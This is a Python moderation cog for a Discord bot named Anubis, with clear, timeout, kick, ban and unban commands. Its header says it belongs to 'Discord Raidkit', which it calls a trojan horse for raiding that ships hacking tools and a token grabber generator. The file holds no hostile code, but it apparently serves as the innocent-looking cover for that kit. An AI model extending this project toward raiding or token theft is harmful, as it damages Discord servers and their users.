"""
Discord Raidkit v2.3.4 — "The trojan horse of discord raiding"
Copyright © 2023 the-cult-of-integral

a collection of raiding tools, hacking tools, and a token grabber generator for discord; written in Python 3

This program is under the GNU General Public License v2.0.
https://github.com/the-cult-of-integral/discord-raidkit/blob/master/LICENSE

moderation.py stores the moderation commands for Anubis.
moderation.py was last updated on 05/03/23 at 20:49 UTC.
"""

import logging
from datetime import timedelta

import discord
from discord import app_commands
from discord.app_commands import Choice
from discord.ext import commands

from utils import init_logger

init_logger()


class Moderation(commands.Cog):
    def __init__(self, bot: commands.Bot) -> None:
        self.bot = bot
        return

    @app_commands.command(
        name='clear',
        description='Clears a number of latest messages from a text channel.')
    @app_commands.describe(
        number='The number of messages to clear.')
    async def clear(self, interaction: discord.Interaction, number: int) -> None:
        try:
            await interaction.response.defer(ephemeral=True)
            if interaction.user.guild_permissions.manage_messages or interaction.user.guild_permissions.administrator:
                await interaction.channel.purge(limit=number)

                embed = discord.Embed(
                    title='Clear',
                    description=f'{interaction.channel.mention} has been cleared by {number} messages.',
                    color=discord.Color.blue())
                await interaction.followup.send(embed=embed)
            else:
                embed = discord.Embed(
                    title='Clear',
                    description='You do not have permission to use this command.',
                    color=discord.Color.brand_red())
                await interaction.followup.send(embed=embed)

        except discord.errors.Forbidden:
            embed = discord.Embed(
                title='Action Forbidden',
                description=f'I do not have the required permissions to clear {interaction.channel.mention}.',
                color=discord.Color.brand_red())
            await interaction.followup.send(embed=embed)

        except Exception as e:
            logging.error(
                f'Error in moderation.py - clear(): {e}')
            await interaction.followup.send(f'Error: {e}')

        return

    @app_commands.command(
        name='timeout',
        description='Timeout a user for a number of minutes, with an optional message.')
    @app_commands.describe(
        user='The user to timeout.',
        minutes='The number of minutes to timeout the user for.',
        reason='The reason for the timeout.',
        send_message='Whether to send a message to the user with the reason.')
    @app_commands.choices(
        send_message=[
            Choice(name='Yes', value=1),
            Choice(name='No', value=0)
        ])
    async def timeout(self, interaction: discord.Interaction, user: discord.Member, minutes: int, reason: str,
                      send_message: int) -> None:
        try:
            await interaction.response.defer(ephemeral=True)
            if interaction.user.guild_permissions.moderate_members or interaction.user.guild_permissions.administrator:
                await user.timeout(timedelta(minutes=minutes), reason=reason)

                if send_message == 1:
                    embed = discord.Embed(
                        title='Timeout',
                        description=f'You have been timed out for {minutes} minutes.',
                        color=discord.Color.blue())
                    embed.add_field(name='Reason', value=reason, inline=True)
                    embed.set_footer(text=f'Server: {interaction.guild.name}')
                    await user.send(embed=embed)

                embed = discord.Embed(
                    title='Timeout',
                    description=f'{user.mention} has been timed out for {minutes} minutes.',
                    color=discord.Color.blue())
                await interaction.followup.send(embed=embed)
            else:
                embed = discord.Embed(
                    title='Timeout',
                    description='You do not have permission to use this command.',
                    color=discord.Color.brand_red())
                await interaction.followup.send(embed=embed)

        except discord.errors.Forbidden:
            embed = discord.Embed(
                title='Action Forbidden',
                description=f'I do not have the required permissions to timeout {user.mention}.',
                color=discord.Color.brand_red())
            await interaction.followup.send(embed=embed)

        except Exception as e:
            logging.error(
                f'Error in moderation.py - timeout(): {e}')
            await interaction.followup.send(f'Error: {e}')

        return

    @app_commands.command(
        name='kick',
        description='Kick a user from the server.')
    @app_commands.describe(
        user='The user to kick.',
        reason='The reason for the kick.',
        send_message='Whether to send a message to the user with the reason.')
    @app_commands.choices(
        send_message=[
            Choice(name='Yes', value=1),
            Choice(name='No', value=0)
        ])
    async def kick(self, interaction: discord.Interaction, user: discord.Member, reason: str,
                   send_message: int) -> None:
        try:
            await interaction.response.defer(ephemeral=True)
            if interaction.user.guild_permissions.kick_members or interaction.user.guild_permissions.administrator:
                if send_message == 1:
                    embed = discord.Embed(
                        title='Kick',
                        description=f'You have been kicked from {interaction.guild.name}.',
                        color=discord.Color.blue())
                    embed.add_field(name='Reason', value=reason, inline=True)
                    embed.set_footer(text=f'Server: {interaction.guild.name}')
                    await user.send(embed=embed)

                await user.kick(reason=reason)

                embed = discord.Embed(
                    title='Kick',
                    description=f'{user.mention} has been kicked from {interaction.guild.name}.',
                    color=discord.Color.blue())
                await interaction.followup.send(embed=embed)
            else:
                embed = discord.Embed(
                    title='Kick',
                    description='You do not have permission to use this command.',
                    color=discord.Color.brand_red())
                await interaction.followup.send(embed=embed)

        except discord.errors.Forbidden:
            embed = discord.Embed(
                title='Action Forbidden',
                description=f'I do not have the required permissions to kick {user.mention}.',
                color=discord.Color.brand_red())
            await interaction.followup.send(embed=embed)

        except Exception as e:
            logging.error(
                f'Error in moderation.py - kick(): {e}')
            await interaction.followup.send(f'Error: {e}')
        return

    @app_commands.command(
        name='ban',
        description='Ban a user from the server.')
    @app_commands.describe(
        user='The user to ban.',
        reason='The reason for the ban.',
        send_message='Whether to send a message to the user with the reason.')
    @app_commands.choices(
        send_message=[
            Choice(name='Yes', value=1),
            Choice(name='No', value=0)
        ])
    async def ban(self, interaction: discord.Interaction, user: discord.Member, reason: str, send_message: int) -> None:
        try:
            await interaction.response.defer(ephemeral=True)
            if interaction.user.guild_permissions.ban_members or interaction.user.guild_permissions.administrator:
                if send_message == 1:
                    embed = discord.Embed(
                        title='Ban',
                        description=f'You have been banned from {interaction.guild.name}.',
                        color=discord.Color.blue())
                    embed.add_field(name='Reason', value=reason, inline=True)
                    embed.set_footer(text=f'Server: {interaction.guild.name}')
                    await user.send(embed=embed)

                await user.ban(reason=reason)

                embed = discord.Embed(
                    title='Ban',
                    description=f'{user.mention} has been banned from {interaction.guild.name}.',
                    color=discord.Color.blue())
                await interaction.followup.send(embed=embed)
            else:
                embed = discord.Embed(
                    title='Ban',
                    description='You do not have permission to use this command.',
                    color=discord.Color.brand_red())
                await interaction.followup.send(embed=embed)

        except discord.errors.Forbidden:
            embed = discord.Embed(
                title='Action Forbidden',
                description=f'I do not have the required permissions to ban {user.mention}.',
                color=discord.Color.brand_red())
            await interaction.followup.send(embed=embed)

        except Exception as e:
            logging.error(
                f'Error in moderation.py - ban(): {e}')
            await interaction.followup.send(f'Error: {e}')
        return

    @app_commands.command(
        name='unban',
        description='Unban a user from the server.')
    @app_commands.describe(
        user='The user to unban.',
        reason='The reason for the unban.')
    async def unban(self, interaction: discord.Interaction, user: discord.Member, reason: str) -> None:
        try:
            await interaction.response.defer(ephemeral=True)
            if interaction.user.guild_permissions.ban_members or interaction.user.guild_permissions.administrator:
                await interaction.guild.unban(user, reason=reason)

                embed = discord.Embed(
                    title='Unban',
                    description=f'{user.mention} has been unbanned from {interaction.guild.name}.',
                    color=discord.Color.blue())
                await interaction.followup.send(embed=embed)
            else:
                embed = discord.Embed(
                    title='Unban',
                    description='You do not have permission to use this command.',
                    color=discord.Color.brand_red())
                await interaction.followup.send(embed=embed)

        except discord.errors.Forbidden:
            embed = discord.Embed(
                title='Action Forbidden',
                description=f'I do not have the required permissions to unban {user.mention}.',
                color=discord.Color.brand_red())
            await interaction.followup.send(embed=embed)

        except Exception as e:
            logging.error(
                f'Error in moderation.py - unban(): {e}')
            await interaction.followup.send(f'Error: {e}')
        return


async def setup(bot: commands.Bot) -> None:
    await bot.add_cog(Moderation(bot))
